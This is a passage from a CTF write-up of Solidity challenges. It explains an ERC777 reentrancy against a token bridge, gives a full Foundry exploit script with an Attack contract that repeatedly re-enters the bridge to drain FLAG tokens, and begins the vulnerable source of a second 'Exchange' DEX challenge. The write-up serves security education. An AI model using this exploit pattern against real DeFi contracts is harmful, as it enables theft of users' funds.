</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>memory </span><span>userData,
</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>memory </span><span>operatorData,
</span><span>        </span><span style=color:#0086b3>bool </span><span>requireReceptionAck
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>internal virtual </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(from </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(0), </span><span style=color:#183691>"ERC777: transfer from the zero address"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(to </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(0), </span><span style=color:#183691>"ERC777: transfer to the zero address"</span><span>);
</span><span>
</span><span>        </span><span style=color:#0086b3>address</span><span> operator </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_msgSender</span><span>();
</span><span>
</span><span>        </span><span style=color:#62a35c>_callTokensToSend</span><span>(operator, from, to, amount, userData, operatorData);
</span><span>
</span><span>        </span><span style=color:#62a35c>_move</span><span>(operator, from, to, amount, userData, operatorData);
</span><span>
</span><span>        </span><span style=color:#62a35c>_callTokensReceived</span><span>(operator, from, to, amount, userData, operatorData, requireReceptionAck);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_callTokensToSend</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span>operator,
</span><span>        </span><span style=color:#0086b3>address </span><span>from,
</span><span>        </span><span style=color:#0086b3>address </span><span>to,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount,
</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>memory </span><span>userData,
</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>memory </span><span>operatorData
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>private </span><span>{
</span><span>        </span><span style=color:#0086b3>address</span><span> implementer </span><span style=color:#a71d5d;font-weight:700>=</span><span> _ERC1820_REGISTRY.</span><span style=color:#62a35c>getInterfaceImplementer</span><span>(from, _TOKENS_SENDER_INTERFACE_HASH);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(implementer </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(0)) {
</span><span>            </span><span style=color:#0086b3>IERC777Sender</span><span>(implementer).</span><span style=color:#62a35c>tokensToSend</span><span>(operator, from, to, amount, userData, operatorData);
</span><span>        }
</span><span>    }
</span></code></pre><h3 id=attack>Attack</h3><ul><li><p>Deploy an Attacker contract and register this attacker contract as the Implementer for the Player.</p><li><p>Send <code>0.5 ether</code> amount of ERC777 tokens to Attack</p><li><p>Inside <code>tokensToSend(operator, from, to, amount, userData, operatorData)</code> function of Attack contract, add the following logic</p> <ul><li>reenter to the <code>ERC20Out()</code> function by sending same <code>amount</code> again.</ul><li><p>Start the attack by calling <code>ERC20Out()</code> function with amount <code>0.5 ether</code>.</p><li><p>The following vulnerable lines of code will execute</p> <pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>    </span><span style=color:#0086b3>uint256</span><span> balance </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));  </span><span style=color:#969896;font-style:italic>// 100 ether
</span><span>    require(</span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), _amount), </span><span style=color:#183691>"T"</span><span>); </span><span style=color:#969896;font-style:italic>// Call to Attack.tokensToSend()
</span><span>    _amount </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)) </span><span style=color:#a71d5d;font-weight:700>-</span><span> balance;
</span></code></pre><li><p>Attack contract wil reenter the function with amount <code>0.5 ether</code>, but the bridge balance is still 100 ether.</p><li><p>Second <code>tranferFrom</code> call from Attack will be succeeded and Attack contract will get <code>0.5 ether</code> of <code>BridgedERC20</code> tokens. Bridge also gets <code>0.5 ether</code> of ERC777 tokens.</p><li><p>First <code>transferFrom</code> call completes will get <code>0.5 ether</code> of <code>BridgedERC20</code> tokens. Bridge also gets <code>0.5 ether</code> of ERC777 tokens. Bridge balance is now <code>101 ether</code></p><li><p>Now on the third line <code> _amount = IERC20(_token).balanceOf(address(this)) - balance;</code></p> <ul><li><code>_amount = 101 ether - 100 ether = 1 ether</code></ul><li><p>Now the <code>1 ether</code> of <code>BridgedERC20</code> will be minted to Player.</p><li><p>If we bridge these tokens back, <code>BridgedERC20</code> will be burned and <code>ERC777</code>(FLAG) tokens will be sent to Player.</p><li><p>After one successfull iteration of these steps we got <code>0.5 ether</code> of more tokens than we have.</p></ul><p>Now do you own math and find a way to execute this logic until you got atleast <code>10 ether</code> of ERC777 tokens or FLAG tokens.<p>Don't look at my following exploit, I did a terrible math there.<div class=note-container><button class=note-toggle><div class=note-icon><p>Bridge.s.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: SEE LICENSE IN LICENSE
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.20</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {Script} from "forge-std/Script.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {console} from "forge-std/console.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {Bridge, Token, BridgedERC20} from "../src/Bridge.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>IERC20</span><span>, </span><span style=color:#0086b3>IERC20Metadata</span><span>} from "@openzeppelin-contracts-4.8.0/contracts/token/</span><span style=color:#0086b3>ERC20</span><span>/extensions/</span><span style=color:#0086b3>IERC20Metadata</span><span>.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>IERC777Sender</span><span>} from "@openzeppelin-contracts-4.8.0/contracts/token/</span><span style=color:#0086b3>ERC777</span><span>/</span><span style=color:#0086b3>IERC777Sender</span><span>.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>IERC1820Registry</span><span>} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/</span><span style=color:#0086b3>IERC1820Registry</span><span>.sol";
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>ERC1820Implementer</span><span>} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/</span><span style=color:#0086b3>ERC1820Implementer</span><span>.sol";
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>BridgeSolve </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
</span><span>    Bridge </span><span style=color:#a71d5d;font-weight:700>public </span><span>bridge </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Bridge</span><span>(</span><span style=color:#0086b3>payable</span><span>(</span><span style=color:#0086b3>0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba</span><span>));
</span><span>    Bridge </span><span style=color:#a71d5d;font-weight:700>public </span><span>remoteBridge;
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>flagToken;
</span><span>    
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> relayer;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> CHAIN_ID </span><span style=color:#a71d5d;font-weight:700>=</span><span> 1;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> REMOTE_CHAIN_ID </span><span style=color:#a71d5d;font-weight:700>=</span><span> 2;
</span><span>    </span><span style=color:#0086b3>IERC1820Registry </span><span style=color:#a71d5d;font-weight:700>internal constant</span><span> _ERC1820_REGISTRY </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC1820Registry</span><span>(</span><span style=color:#0086b3>0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24</span><span>);
</span><span>    </span><span style=color:#0086b3>bytes32 </span><span style=color:#a71d5d;font-weight:700>private constant</span><span> _TOKENS_SENDER_INTERFACE_HASH </span><span style=color:#a71d5d;font-weight:700>= keccak256</span><span>(</span><span style=color:#183691>"ERC777TokensSender"</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        vm.</span><span style=color:#62a35c>startBroadcast</span><span>(vm.</span><span style=color:#62a35c>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>envAddress</span><span>(</span><span style=color:#183691>"PLAYER"</span><span>);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player : "</span><span>, player);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance: "</span><span>, player.balance);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Bridge: "</span><span>, </span><span style=color:#0086b3>address</span><span>(bridge));
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("Bridge balance: ", address(bridge).balance);
</span><span>        flagToken </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Token</span><span>(bridge.</span><span style=color:#62a35c>FLAG_TOKEN</span><span>());
</span><span>        </span><span style=color:#969896;font-style:italic>// relayer = bridge.relayer();
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"FLAG_TOKEN: "</span><span>, </span><span style=color:#0086b3>address</span><span>(flagToken));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of FLAG : "</span><span>, flagToken.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"SOURCE Bridge balance of FLAG : "</span><span>, flagToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(bridge)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"SOURCE CHAIN_ID : "</span><span>, CHAIN_ID);
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("isSolved(): ", bridge.isSolved());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Total Default operators of FLAG : "</span><span>, flagToken.</span><span style=color:#62a35c>defaultOperators</span><span>().</span><span style=color:#a71d5d;font-weight:700>length</span><span>); </span><span style=color:#969896;font-style:italic>// NO operators
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("Relayer: ", relayer);
</span><span>        remoteBridge </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Bridge</span><span>(</span><span style=color:#0086b3>payable</span><span>(bridge.</span><span style=color:#62a35c>remoteBridge</span><span>(REMOTE_CHAIN_ID)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"REMOTE CHAIN_ID : "</span><span>, REMOTE_CHAIN_ID);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"REMOTE Bridge: "</span><span>, </span><span style=color:#0086b3>address</span><span>(remoteBridge));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"REMOTE Bridge balance: "</span><span>, </span><span style=color:#0086b3>address</span><span>(remoteBridge).balance);
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Attack</span><span>(</span><span style=color:#0086b3>address</span><span>(bridge), </span><span style=color:#969896;font-style:italic>/*address(bridgedToken)*/ </span><span style=color:#0086b3>address</span><span>(flagToken), player);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack : "</span><span>, </span><span style=color:#0086b3>address</span><span>(attack));
</span><span>       _ERC1820_REGISTRY.</span><span style=color:#62a35c>setInterfaceImplementer</span><span>(player, _TOKENS_SENDER_INTERFACE_HASH, </span><span style=color:#0086b3>address</span><span>(attack));
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(attack.</span><span style=color:#62a35c>isRegister</span><span>()</span><span style=color:#a71d5d;font-weight:700>==</span><span style=color:#0086b3>address</span><span>(attack), </span><span style=color:#183691>"Failed to set interface"</span><span>);
</span><span>        flagToken.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(bridge), </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>);
</span><span>        </span><span style=color:#0086b3>address</span><span> bridgedToken;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>while </span><span>(flagToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(bridge)) </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>89 ether</span><span>) {
</span><span>        </span><span style=color:#969896;font-style:italic>// for (uint8 i; i &lt;=1; i++){
</span><span>            </span><span style=color:#0086b3>uint256</span><span> amount </span><span style=color:#a71d5d;font-weight:700>=</span><span> flagToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player))</span><span style=color:#a71d5d;font-weight:700>/</span><span>2;
</span><span>            flagToken.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#0086b3>address</span><span>(attack), amount);
</span><span>            bridge.</span><span style=color:#0086b3>ERC20Out</span><span>(</span><span style=color:#0086b3>address</span><span>(flagToken), player, amount);
</span><span>            bridgedToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> remoteBridge.</span><span style=color:#62a35c>remoteTokenToLocalToken</span><span>(</span><span style=color:#0086b3>address</span><span>(flagToken));
</span><span>            attack.</span><span style=color:#62a35c>sendMeback</span><span>();
</span><span>            remoteBridge.</span><span style=color:#0086b3>ERC20Out</span><span>(bridgedToken, player, </span><span style=color:#62a35c>BridgedERC20</span><span>(bridgedToken).</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        }
</span><span>        bridgedToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> remoteBridge.</span><span style=color:#62a35c>remoteTokenToLocalToken</span><span>(</span><span style=color:#0086b3>address</span><span>(flagToken));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"REMOTE Bridge balance of FLAG : "</span><span>, flagToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(remoteBridge)));
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("IS FLAG token registed at remote : ", bridge.isTokenRegisteredAtRemote(REMOTE_CHAIN_ID, address(flagToken)));
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("FLAG token to local token(BridgedERC20) : ", bridgedToken);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of BridgedERC20 : "</span><span>, </span><span style=color:#62a35c>BridgedERC20</span><span>(bridgedToken).</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("Attack balance of BridgedERC20 : ", BridgedERC20(bridgedToken).balanceOf(address(attack)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of FLAG : "</span><span>, flagToken.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"SOURCE Bridge balance of FLAG : "</span><span>, flagToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(bridge)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack balance of FLAG : "</span><span>, flagToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(attack)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"isSolved(): "</span><span>, bridge.</span><span style=color:#62a35c>isSolved</span><span>());
</span><span>        vm.</span><span style=color:#62a35c>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Attack </span><span style=color:#a71d5d;font-weight:700>is ERC1820Implementer</span><span>, </span><span style=color:#a71d5d;font-weight:700>IERC777Sender </span><span>{
</span><span>    </span><span style=color:#969896;font-style:italic>// BridgedERC20 public bridgedERC20;
</span><span>    Bridge </span><span style=color:#a71d5d;font-weight:700>public </span><span>bridge;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> flagToken;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;
</span><span>    </span><span style=color:#0086b3>bytes32 </span><span style=color:#a71d5d;font-weight:700>private constant</span><span> _TOKENS_SENDER_INTERFACE_HASH </span><span style=color:#a71d5d;font-weight:700>= keccak256</span><span>(</span><span style=color:#183691>"ERC777TokensSender"</span><span>);
</span><span>    </span><span style=color:#0086b3>IERC1820Registry </span><span style=color:#a71d5d;font-weight:700>internal constant</span><span> _ERC1820_REGISTRY </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC1820Registry</span><span>(</span><span style=color:#0086b3>0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_bridge, </span><span style=color:#969896;font-style:italic>/*address _bridgedERC20,*/ </span><span style=color:#0086b3>address </span><span>_flagToken, </span><span style=color:#0086b3>address </span><span>_player) {
</span><span>        bridge </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Bridge</span><span>(</span><span style=color:#0086b3>payable</span><span>(_bridge));
</span><span>        </span><span style=color:#969896;font-style:italic>// bridgedERC20 = BridgedERC20(_bridgedERC20);
</span><span>        flagToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> _flagToken;
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>        </span><span style=color:#62a35c>_registerInterfaceForAddress</span><span>(_TOKENS_SENDER_INTERFACE_HASH, player);
</span><span>        </span><span style=color:#0086b3>IERC20</span><span>(flagToken).</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(bridge), </span><span style=color:#a71d5d;font-weight:700>type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>);
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isRegister</span><span>() </span><span style=color:#a71d5d;font-weight:700>public returns </span><span>(</span><span style=color:#0086b3>address</span><span> implementer){
</span><span>        implementer </span><span style=color:#a71d5d;font-weight:700>=</span><span> _ERC1820_REGISTRY.</span><span style=color:#62a35c>getInterfaceImplementer</span><span>(player, _TOKENS_SENDER_INTERFACE_HASH);
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sendMeback</span><span>() </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#0086b3>IERC20</span><span>(flagToken).</span><span style=color:#62a35c>transfer</span><span>(player, </span><span style=color:#0086b3>IERC20</span><span>(flagToken).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)));
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>tokensToSend</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span>operator,
</span><span>        </span><span style=color:#0086b3>address </span><span>from,
</span><span>        </span><span style=color:#0086b3>address </span><span>to,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount,
</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>userData,
</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>operatorData
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>((from </span><span style=color:#a71d5d;font-weight:700>==</span><span> player </span><span style=color:#a71d5d;font-weight:700>&&</span><span> to </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)) </span><span style=color:#a71d5d;font-weight:700>|| </span><span>(from </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>address</span><span>(bridge) </span><span style=color:#a71d5d;font-weight:700>&&</span><span> to </span><span style=color:#a71d5d;font-weight:700>==</span><span> player)){
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return</span><span>;
</span><span>        }
</span><span>        bridge.</span><span style=color:#0086b3>ERC20Out</span><span>(</span><span style=color:#0086b3>address</span><span>(flagToken), player, amount);
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=exchange>Exchange</h1><p>P: "You heard there is a new Dex primitive that has launched on-chain with a lot of tokens. As a whitehat hacker, you race to find any bugs before the blackhats do. Can you rescue the tokens from the contract?"<div class=note-container><button class=note-toggle><div class=note-icon><p>Exchange.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: UNLICENSED
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.24</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span style=color:#62a35c>SwapCallback </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>doSwap</span><span>() </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Setup </span><span>{
</span><span>    Exchange </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>exchange </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Exchange</span><span>();
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256</span><span> balance1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>300_000</span><span>;
</span><span>    </span><span style=color:#0086b3>uint256</span><span> balance2 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>300_000</span><span>;
</span><span>    </span><span style=color:#0086b3>uint256</span><span> balance3 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>600_000</span><span>;
</span><span>
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token1 </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Token</span><span>(balance1);
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token2 </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Token</span><span>(balance2);
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public </span><span>token3 </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Token</span><span>(balance3);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>() {
</span><span>        exchange.</span><span style=color:#62a35c>addToken</span><span>(</span><span style=color:#0086b3>address</span><span>(token1));
</span><span>        exchange.</span><span style=color:#62a35c>addToken</span><span>(</span><span style=color:#0086b3>address</span><span>(token2));
</span><span>        exchange.</span><span style=color:#62a35c>addToken</span><span>(</span><span style=color:#0086b3>address</span><span>(token3));
</span><span>
</span><span>        token1.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange), balance1);
</span><span>        token2.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange), balance2);
</span><span>        token3.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange), balance3);
</span><span>
</span><span>        exchange.</span><span style=color:#62a35c>addLiquidity</span><span>(</span><span style=color:#0086b3>address</span><span>(token1), </span><span style=color:#0086b3>address</span><span>(token2), balance1 </span><span style=color:#a71d5d;font-weight:700>/</span><span> 3, balance2 </span><span style=color:#a71d5d;font-weight:700>/</span><span> 3);
</span><span>
</span><span>        exchange.</span><span style=color:#62a35c>addLiquidity</span><span>(</span><span style=color:#0086b3>address</span><span>(token1), </span><span style=color:#0086b3>address</span><span>(token3), balance1 </span><span style=color:#a71d5d;font-weight:700>/</span><span> 3, balance3 </span><span style=color:#a71d5d;font-weight:700>/</span><span> 3);
</span><span>
</span><span>        exchange.</span><span style=color:#62a35c>addLiquidity</span><span>(</span><span style=color:#0086b3>address</span><span>(token2), </span><span style=color:#0086b3>address</span><span>(token3), balance2 </span><span style=color:#a71d5d;font-weight:700>/</span><span> 3, balance3 </span><span style=color:#a71d5d;font-weight:700>/</span><span> 3);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(
</span><span>            </span><span style=color:#62a35c>Token</span><span>(token1).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange)) </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0 </span><span style=color:#a71d5d;font-weight:700>&& </span><span style=color:#62a35c>Token</span><span>(token2).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange)) </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0
</span><span>                </span><span style=color:#a71d5d;font-weight:700>&& </span><span style=color:#62a35c>Token</span><span>(token3).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(exchange)) </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0
</span><span>        );
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Exchange </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>struct </span><span style=color:#62a35c>Pool </span><span>{
</span><span>        </span><span style=color:#0086b3>uint256</span><span> leftReserves;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> rightReserves;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>struct </span><span style=color:#62a35c>SavedBalance </span><span>{
</span><span>        </span><span style=color:#0086b3>bool</span><span> initiated;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> balance;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>struct </span><span style=color:#62a35c>SwapState </span><span>{
</span><span>        </span><span style=color:#0086b3>bool</span><span> hasBegun;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> unsettledTokens;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>int256</span><span>) positions;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>SavedBalance) savedBalances;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> admin;
</span><span>    </span><span style=color:#0086b3>uint256</span><span> nonce </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>bool</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> allowedTokens;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span>SwapState) </span><span style=color:#a71d5d;font-weight:700>private</span><span> swapStates;
